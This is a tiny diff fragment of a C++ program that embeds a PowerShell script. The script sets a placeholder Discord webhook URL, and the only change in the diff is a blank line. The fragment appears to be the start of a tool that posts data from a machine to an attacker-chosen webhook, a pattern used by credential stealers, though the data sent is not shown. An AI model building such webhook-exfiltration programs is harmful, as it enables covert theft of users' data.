@@ -4,6 +4,7 @@
 #include <fstream>
 #include <cstdlib>
 
+
 int main() {
     const std::string psScript =
         "$webhookURL = \"https://discord.com/api/webhooks/your-custom-webhook\";\n"   // make sure to replace with your own webhook url
